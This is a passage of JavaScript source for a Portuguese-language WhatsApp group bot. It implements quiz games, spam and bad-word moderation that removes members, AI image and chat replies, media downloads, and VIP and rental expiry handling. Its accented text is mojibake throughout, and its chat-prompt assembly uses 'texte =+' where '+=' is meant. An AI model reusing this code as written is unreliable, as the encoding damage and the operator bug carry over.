if(fs.existsSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`)) {
dataW = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`))
reply(`JÃ¡ existe uma partida iniciada aqui no grupo, confira:\nâ€“\n${dataW.trechoMusic}\nâ€“\nğŸ¤”ğŸ˜± Qual mÃºsica pertence o trecho apresentado acima?\nâ€¢ ${II}Dica:${II} ${dataW.dica}`)} else {
fs.writeFileSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`, `${JSON.stringify(whatMusicAr[whatMAle])}`)
await yoko.sendMessage(from, {text: `ğŸ¶ğŸ§ ğ–ğ‡ğ€ğ“ ğŒğ”ğ’ğˆğ‚? ğŸ˜±ğŸ’¡\nâ€“\n${whatMusicAr[whatMAle].trechoMusic}\nâ€“\nğŸ¤”ğŸ˜± Qual mÃºsica pertence o trecho apresentado acima?\nâ€¢ ${II}Dica:${II} ${whatMusicAr[whatMAle].dica}`}, {quoted: selo})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`)) return reply('NÃ£o tem como desativar o jogo, pois ele nÃ£o foi ativado')
fs.unlinkSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`)
reply("Desativado com sucesso.");
}
break

case 'gartic':
if (!isGroup) return reply(mess.onlyGroup()) 
if (!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
const garticquiz = Math.floor(Math.random() * garticArchives.length)
if(args.length == 0) return reply('Use 1 para ativar o gartic, ou seja, para desativar utilize o valor numÃ©rico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`)) {
dataGartic2 = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`))
await yoko.sendMessage(from, {image: {url: `${dataGartic2.imagem}`}, caption: `ğŸ‘©ğŸ¼â€ğŸ« - A resposta Ã© representada por um(a): ${dataGartic2.pergunta}\nğŸ“œ - A resposta supostamente comeÃ§a com a(s) letra(s): "${dataGartic2.letra_inicial}"\nğŸ¤” - Hmmm, contÃ©m traÃ§os? ${dataGartic2.contem_traÃ§os}\nâ€“\nâ“ï¸ - *NÃ£o sabe a resposta?* _PeÃ§a ao adm do grupo para usar o comando *${prefix}revelargartic* para revelar a resposta correta da afirmaÃ§Ã£o._`}, {quoted: selo});
} else {
fs.writeFileSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`, `${JSON.stringify(garticArchives[garticquiz])}`)
await yoko.sendMessage(from, {image: {url: `${garticArchives[garticquiz].imagem}`}, caption: `ğŸ‘©ğŸ¼â€ğŸ« - A resposta Ã© representada por um(a): ${garticArchives[garticquiz].pergunta}\nğŸ“œ - A resposta supostamente comeÃ§a com a(s) letra(s): "${garticArchives[garticquiz].letra_inicial}"\nğŸ¤” - Hmmm, contÃ©m traÃ§os? ${garticArchives[garticquiz].contem_traÃ§os}\nâ€“\nâ“ï¸ - *NÃ£o sabe a resposta?* _PeÃ§a ao adm do grupo para usar o comando *${prefix}revelargartic* para revelar a resposta correta da afirmaÃ§Ã£o._`}, {quoted: selo});
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`)) return reply('NÃ£o tem como desativar o gartic pÃ´s ele nÃ£o foi ativado.');
fs.unlinkSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`)
reply("Desativado com sucesso.")
}
break

case 'enigma':
if (!isGroup) return reply(mess.onlyGroup()) 
if (!isGroupAdmins) return reply('Somente adms!')
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
const engimaSolu = Math.floor(Math.random() * enigmaArchive.length)
if(args.length == 0) return reply('Use 1 para ativar o enigma, ou seja, para desativar utilize o valor numÃ©rico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`)) {
NAGA_NAGA_ENI = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`))
await yoko.sendMessage(from, {image: {url: `https://telegra.ph/file/15be608763684b3e3af38.jpg`}, caption: `ğŸ“œ - Resolva o seguinte enigma abaixo:\nâ€“\n${NAGA_NAGA_ENI.charada}\nâ€“\nâ“ï¸ - *NÃ£o sabe a resposta?* _PeÃ§a ao adm do grupo para usar o comando *${prefix}revelarenigma* para revelar a resposta correta da enigma._`, thumbnail: wew}, {quoted: selo});
} else {
fs.writeFileSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`, `${JSON.stringify(enigmaArchive[engimaSolu])}`)
await yoko.sendMessage(from, {image: {url: `https://telegra.ph/file/15be608763684b3e3af38.jpg`}, caption: `ğŸ“œ - Resolva o seguinte enigma abaixo:\nâ€“\n${enigmaArchive[engimaSolu].charada}\nâ€“\nâ“ï¸ - *NÃ£o sabe a resposta?* _PeÃ§a ao adm do grupo para usar o comando *${prefix}revelarenigma* para revelar a resposta correta da enigma._`, thumbnail: wew}, {quoted: selo});
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`)) return reply('NÃ£o tem como desativar o enigma pÃ´s ele nÃ£o foi ativado.');
fs.unlinkSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`)
reply("Desativado com sucesso.");
}
break

case 'quizfutebol': case 'quizfut':
if (!isGroup) return reply(mess.onlyGroup());
if (!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
const futebolquiz = Math.floor(Math.random() * quizFutebol.length)
if(args.length == 0) return reply('Use 1 para ativar o quiz futebol, ou seja, para desativar utilize o valor numÃ©rico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`)) {
superrttrr = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`))
texto = `â€¢ JÃ¡ existe uma partida iniciada aqui no grupo! Resolva a pergunta abaixo:\nâ€”\nğŸ’«âš½ ğğ”ğˆğ™ ğ…ğ”ğ“ğ„ğğğ‹ âš½ğŸ’«\nâ€“\n*ğŸ—£ï¸| Responda a pergunta mostrada abaixo:*\nâ€¢ _${superrttrr.pergunta}_`
await yoko.sendMessage(from, {text: texto}, {quoted: selo})
} else {
fs.writeFileSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`, `${JSON.stringify(quizFutebol[futebolquiz])}`)
await yoko.sendMessage(from, {text: `ğŸ’«âš½ ğğ”ğˆğ™ ğ…ğ”ğ“ğ„ğğğ‹ âš½ğŸ’«\nâ€“\n*ğŸ—£ï¸| Responda a pergunta mostrada abaixo:*\nâ€¢ _${quizFutebol[futebolquiz].pergunta}_`}, {quoted: selo})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`)) return reply('NÃ£o tem como desativar o jogo pÃ´s ele nÃ£o foi ativado')
fs.unlinkSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`)
reply("Desativado com sucesso.")
}
break

default:

// IF DOS ANTIs - (LOCALIZAÃ‡ÃƒO - CONTATO - CATALOGO)
if(isGroup && isBotGroupAdmins && !isGroupAdmins) {
if(isAntiCtt || Antiloc || isAnticatalogo) {
if(type === 'contactMessage' || type === 'contactsArrayMessage' || type === 'locationMessage' || type === 'productMessage') {
if(isGroupAdmins) return await yoko.sendMessage(from, {text: mess.antisRandomMessage()}, {quoted: selo})
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return
await yoko.groupParticipantsUpdate(from, [sender], 'remove')
await yoko.sendMessage(from, {text: `ğŸ—‘${"\n".repeat(255)}ğŸ—‘ï¸\nâœ…ï¸ A limpeza de chat foi concluÃ­da com sucesso.`, contextInfo: {forwardingScore: 500, isForwarded:true}});
await yoko.sendMessage(from, {text: 'Por favor, reporte aos adminstradores do grupo sobre o ocorrido.', mentions: groupAdmins})
}
}
}

if(isGroup && isAntiFlood && !SoDono && !isVip && !isnit && isBotGroupAdmins && !isGroupAdmins && !isBot) { 
if(isLimitec == null){var limitefl = limitefll.limitefl} else {var limitefl = isLimitec};
if(budy.length >= limitefl){
setTimeout(async() => {
  reply(mess.charactersAnti());
      console.log(colors.red(`[SPAM DETECTED IN THE GROUP]`), 'Grupo:', colors.yellow(`${groupName}`), colors.white(`OcorrÃªncia: ${hourofc} ${dattofc}`));
    }, 100);
setTimeout(async() => {
 if(IS_DELETE) {
    setTimeout(async() => {
        yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
      }, 500);
    }
 if(!JSON.stringify(groupMembers).includes(sender)) return  
 await yoko.groupParticipantsUpdate(from, [sender], 'remove')
 }, 1000)
}
}

if(budy2 === `abrir grupo` && isGroup && isGroupAdmins && isBotGroupAdmins && groupMetadata.announce == true) {
setTimeout(() => {reagir(from, "âœ…")}, 300)
yoko.groupSettingUpdate(from, 'not_announcement')
reply(`âœ… *${tempo} Ã  todos... O grupo foi aberto novamente*`)
}

if(budy2 === `fechar grupo` && isGroup && isGroupAdmins && isBotGroupAdmins && groupMetadata.announce == false) {
setTimeout(() => {reagir(from, "ğŸš«")}, 300)
yoko.groupSettingUpdate(from, 'announcement')
reply(`ğŸš« *Grupo fechado... As suas ordens vossa senhoria*`)
}

if(budy2 === "bot" && !isBotoff) {
reagir(from, "âœ…")
sendButton(from, {text: "Opa posso lhe ajudar em algo?", footer: `${tempo} ${pushname}`}, yoko, sender, [{type: `cmd`, text: `ã€Œ â™¦ï¸ ã€ğŒğ„ğğ” ğ‹ğˆğ’ğ“ã€Œ â™¦ï¸ ã€`, command: prefix+`menu`}], selo)
}

if(budy2.toLowerCase().startsWith('yoko') && args.length > 0 && isGroup) {
setTimeout(() => {reagir(from, "ğŸ˜")}, 300)
if(args[0] === 'gere') {
try {
const pesquisa = await fetchJson(`https://api-ia.orbital.host/orbital/img-ai?model=V3&prompt=${q}`)
await sleep(1000)
await yoko.sendMessage(from, {image: {url: pesquisa.url}}, {quoted: selo})
} catch(error) {
return reply(mess.error());
}
} else if(args[0] === 'gerar') {
try {
const pesquisa = await fetchJson(`https://api-ia.orbital.host/orbital/img-ai?model=V3&prompt=${q}`)
await sleep(1000)
await yoko.sendMessage(from, {image: {url: pesquisa.url}}, {quoted: selo})
} catch(error) {
return reply(mess.error());
}
} else if(args[0] === 'criar') {
try {
const pesquisa = await fetchJson(`https://api-ia.orbital.host/orbital/img-ai?model=V3&prompt=${q}`)
await sleep(1000)
await yoko.sendMessage(from, {image: {url: pesquisa.url}}, {quoted: selo})
} catch(error) {
return reply(mess.error());
}
} else if(args[0] === 'crie') {
try {
const pesquisa = await fetchJson(`https://api-ia.orbital.host/orbital/img-ai?model=V3&prompt=${q}`)
await sleep(1000)
await yoko.sendMessage(from, {image: {url: pesquisa.url}}, {quoted: selo})
} catch(error) {
return reply(mess.error());
}
} else {
try {
texte =+ `Voce Ã© um chatbot programador pra responder igual a um personagem de anime conhecido como kyoutaka yoko do anime claasroom of the elite, responda e interprete as informaÃ§Ãµes a seguir como o personagem:`
texte =+ q
herc.question({model:"v3",content: texte}).then(response => {
console.log(response.reply);
reply(response.reply)
});
} catch (e){
return reply("Nsei")
}
}
}

if(budy2.toLowerCase().replace("Ã¡", "a") === `audio`) {
await reply(`â¯â¯BAIXANDO AGUARDE..â®â®`)
try {
const LinkPlay = await buscarLink(sender)
await sleep(500)
yoko.sendMessage(from, { audio: {url: `https://api.bronxyshost.com.br/api-bronxys/play?nome_url=${LinkPlay.link}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg",
headerType: 4,
contextInfo: {
externalAdReply: {
title: `${pushname}`,
body: `${LinkPlay.NomeMusica}`,
showAdAttribution: true,
thumbnail: await getBuffer(`${LinkPlay.LinkImage}`),
mediaType: 1,
mediaUrl: `https://orbital.host`,
sourceUrl: `https://orbital.host`}}},{quoted: info}).catch(e => {
reagir(from, "âŒ")
})

} catch(error) {
reply('Teve um erro aqui');
}
    }
    
if(budy2.toLowerCase().replace("Ã­", "i") === `video`) {
await reply(`â¯â¯BAIXANDO AGUARDE..â®â®`)
try {
const LinkPlay = await buscarLink(sender)
await yoko.sendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/play_video?nome_url=${LinkPlay.link}&apikey=${API_KEY_BRONXYS}`}, caption: 'AQUI ESTÃ O SEU VIDEO', mimetype: "video/mp4",}, {quoted: selo});
} catch(error) {
reply("Seja mais especÃ­fico, nÃ£o deu pra encontrar com apenas isto...");
}
    }
if(budy2.toLowerCase() === `doc`) {
await reply(`â¯â¯BAIXANDO AGUARDE..â®â®`)
try {
const LinkPlay = await buscarLink(sender)
await yoko.sendMessage(from, {document: {url: `https://api.bronxyshost.com.br/api-bronxys/play_video?nome_url=${LinkPlay.link}&apikey=${API_KEY_BRONXYS}`}, fileName: 'â¯â¯ğ˜¼ğ™‰ğ™‰ğ˜¼ ğ™‘6 ğ™ğ™‡ğ™ğ™ğ˜¼â®â®.mp3', mimetype: "audio/mpeg"}, {quoted: selo}).catch(async(error) => {
return reply(mess.error())
})
} catch(error) {
reply("Seja mais especÃ­fico, nÃ£o deu pra encontrar com apenas isto...");
}
    }

if(isAutorepo) {
if(budy2 === "bot") {
reply(mess.chamandoBot(pushname, tempo))  
}
 
if(budy2.includes("bot corno")){
if(info.key.fromMe) return 
reply("Corno Ã© vocÃª, seu animal!")
}

if(budy2.includes("adivinha meu celular") || budy2.includes("bot qual meu celular")){
yoko.sendMessage(from, {text: adivinha}, {quoted: selo})
}

if(budy2.includes("boa noite")){
tujuh = await fetch(boa_noite).then(v => v.buffer())
await yoko.sendMessage(from, {audio: tujuh, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
}

if(budy2.includes("boa tarde")){
tujuh = await fetch(boa_tarde).then(v => v.buffer())
await yoko.sendMessage(from, {audio: tujuh, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
}

if(budy2.includes("bom dia")){
tujuh = await fetch(bom_dia).then(v => v.buffer())
await yoko.sendMessage(from, {audio: tujuh, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
}

if(budy2.includes("corno")){
tujuh = await fetch(corno).then(v => v.buffer())
await yoko.sendMessage(from, {audio: tujuh, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
}
}

//=[ ANTI PALAVRAS - (ğŸ¤–) - GRUPOS ]=\\
if(isGroup && isPalavrao && isBotGroupAdmins && !SoDono && !isGroupAdmins) {
if(dataGp[0].antipalavrao.palavras.some(i => budy2.includes(i.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "")))) {
setTimeout(() => {
if(!JSON.stringify(groupMembers).includes(sender)) return 
yoko.groupParticipantsUpdate(from, [sender], 'remove');
setTimeout(() => {yoko.sendMessage(from, {delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})}, 500)
}, 2000);
yoko.sendMessage(from, {text: mess.permissionDenied_rUser()}, {quoted: selo});
}
}

if (isGroup && isSimi && budy != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
emojisList = ['ğŸ¤ ', 'ğŸ’…ğŸ»', 'ğŸ¦¸â€â™€ï¸', 'ğŸ‘®â€â™€ï¸', 'ğŸ˜¹', 'ğŸ˜¸'];
await reagir(from, emojisList[Math.floor(Math.random() * emojisList.length)]);
muehe = await simih(budy);
await yoko.sendMessage(from, {text: muehe}, {quoted: selo}).catch(async(e) => {
reply(mess.errorResponseSimi());
});
}

// COMANDO ERRADO 

hora2 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const privateCmd = (id, pc, cmd, porcentagem) => {
notcmd = `â— ğ˜¾ğ™Šğ™ˆğ˜¼ğ™‰ğ˜¿ğ™Š ğ™‰Ãƒğ™Š ğ™€ğ™‰ğ˜¾ğ™Šğ™‰ğ™ğ™ğ˜¼ğ˜¿ğ™Š â—
â€¢  Comando: ${pc}
â€¢  Comandos Parecido: ${cmd}
â€¢  SemelhanÃ§a: ${porcentagem}%

â€” *Obs: Qualquer DÃºvida Utilize ${prefix}Menu, para vizualizar os comandos*
`
return notcmd
}

if(isCmd) {
setTimeout(() => {reagir(from, "âŒ")}, 1000)
AB = similarityCmd(command)
notcmd = privateCmd(sender, prefix+command, AB[0].comando, AB[0].porcentagem)
mention(notcmd)
}

}}}
//=================

const nmrdn = setting.ownerNumber.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`;

async function forTemporaryVip() {
if(vip.length > 0) {
for (y of vip) {
if(y.save != Number(moment.tz('America/Sao_Paulo').format('DD'))) {
y.save = Number(moment.tz('America/Sao_Paulo').format('DD'));
fs.writeFileSync("./yoko/bunker/database/usuarios/vip.json", JSON.stringify(vip));
if(y.infinito == false) {
if(y.dias > 1) {
y.dias -= 1;
fs.writeFileSync("./yoko/bunker/database/usuarios/vip.json", JSON.stringify(vip));
} else {
yoko.sendMessage(y.id, {text: `âš ï¸ *ATENÃ‡ÃƒO!* Seus dias como usuÃ¡rio vip acabam de terminar, para realizar a renovaÃ§Ã£o entre em contato com o nÃºmero abaixo:\nâ€¢ Contato: *http://wa.me/${nmrdn.split('@')[0]}*\nâ€“â€“\nâ€¢ Desde jÃ¡ muito obrigado pela atenÃ§Ã£o, desculpe-me o incÃ´modo.\nâ€¢ *Essa mensagem Ã© automÃ¡tica*, caso seja um engano entre em contato com nÃºmero acima e saiba mais!`});
AB = vip.map(b => b.id).indexOf(y.id);
vip.splice(AB, 1);
fs.writeFileSync("./yoko/bunker/database/usuarios/vip.json", JSON.stringify(vip));
}
}
}
}
}
}

forTemporaryVip().catch((error) => {console.log(error)});

async function timeRentOficial() {
if(aluguel.length > 0) {
for(x of aluguel) {
if(x.save != Number(moment.tz('America/Sao_Paulo').format('DD')) && x.cortesia == false) {
if(x.tempo > 1) {
if(Number(x.tempo) === 8 || Number(x.tempo) === 4 || Number(x.tempo) === 3 || Number(x.tempo) === 2) return yoko.sendMessage(x.cliente, {text: `ğŸ˜¿âš ï¸ OlÃ¡, acabo de verificar que nosso contrato no grupo *${aluguel[aluguel.map(m => m.id).indexOf(x.id)].nome}* termina em ${Number(x.tempo) === 8 ? `1 semana (7 dias)` : Number(x.tempo) !== 2 ? `${x.tempo - 1} dias` : `24 horas (amanhÃ£)`}...\nâ€¢ NÃ£o deixe de fechar contrato novamente com nossa equipe! *Qualquer dÃºvida, entre em contato com meu proprietÃ¡rio.*`});
x.save = Number(moment.tz('America/Sao_Paulo').format('DD'))
x.tempo -= 1
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
} else {
yoko.sendMessage(x.id, {text: `*O tempo limite deste grupo acabou!ğŸ˜¿ğŸ’”* Para a renovaÃ§Ã£o do contrato entre em contato com o meu dono: *wa.me/${nmrdn.split('@')[0]}*`});
yoko.sendMessage(nmrdn, {text: `ğŸ¤“ğŸ—‘ï¸ SÃ³ passando pra avisar que o tempo limite do grupo *${x.nome}* expirou agora... Visto que o(a) *@${x.cliente.split('@')[0]}* nÃ£o renovou o contrato, eu saÃ­ do grupo dele(a) e apaguei os registros! â™¦ï¸`, mentions: [x.cliente]});
findGroupRG = grupos.map(i => i.id).indexOf(x.id);
grupos.splice(findGroupRG, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
findGroupRent = aluguel.map(i => i.id).indexOf(x.id);
aluguel.splice(findGroupRent, 1);
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
await sleep(4000);
await yoko.groupLeave(x.id);
}
}
}
}
}

timeRentOficial().catch((error) => {console.log(error)});

async function forRentCourtesy() {
if(aluguel.length > 0) {
for(x of aluguel) {
if(x.save != Number(moment.tz('America/Sao_Paulo').format('HH')) && x.cortesia == true) {
if(x.tempo > 0) {
x.save = Number(moment.tz('America/Sao_Paulo').format('HH'));
x.tempo -= 1
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2));
} else {
yoko.sendMessage(x.id, {text: `â™¦ï¸ğŸ’³ *O cartÃ£o cortesia 24h deste grupo expirou!* Caso se veja interessado em nossos serviÃ§os, favor entrar em contato com meu dono: *wa.me/${setting.ownerNumber}*`})
yoko.sendMessage(nmrdn, {text: `ğŸ¤“ğŸ—‘ï¸SÃ³ passando pra avisar que o cartÃ£o cortesia do grupo *${x.nome}* expirou agora... Visto que nÃ£o houve alteraÃ§Ã£o em meus registros, eu saÃ­ do grupo e apaguei os dados! â™¦ï¸`});
grupos.splice(grupos.map(i => i.id).indexOf(x.id), 1);
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
aluguel.splice(aluguel.map(i => i.id).indexOf(x.id), 1);
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2));
await sleep(4000);
await yoko.groupLeave(x.id);
}
}
}
}
}

forRentCourtesy().catch((error) => {console.log(error)});

startFunctionNaga().catch(async(error) => {
if(JSON.stringify(error).includes(API_KEY_AKAME)) {} else  if(String(error).includes("Erro: aborted")) {
fileStart = require.resolve("./yoko/connect.js");
delete require.cache[fileStart];
require(fileStart);
} else if(String(error).includes("nativeFlowResponseMessage")) {
// Para ignorar um erro contendo essa funÃ§Ã£o, atÃ© a correÃ§Ã£o, estÃ¡ funcionando perfeitamente. //
} else { 
return console.log('O servidor-geral caiu ou nÃ£o foi possivel executar esta aÃ§Ã£o.', error);
}
})
}
}

/* Atualizar o arquivo de forma automÃ¡tica, apÃ³s o index.js ser salvo com uma modificaÃ§Ã£o.*/
fs.watchFile(require.resolve(__filename), () => {
    fs.unwatchFile(require.resolve(__filename));
    console.log(colors.red(`AlteraÃ§Ãµes salvas - '${__filename}'`));
    delete require.cache[require.resolve(__filename)]
    require(require.resolve(__filename))
})

module.exports = startyoko;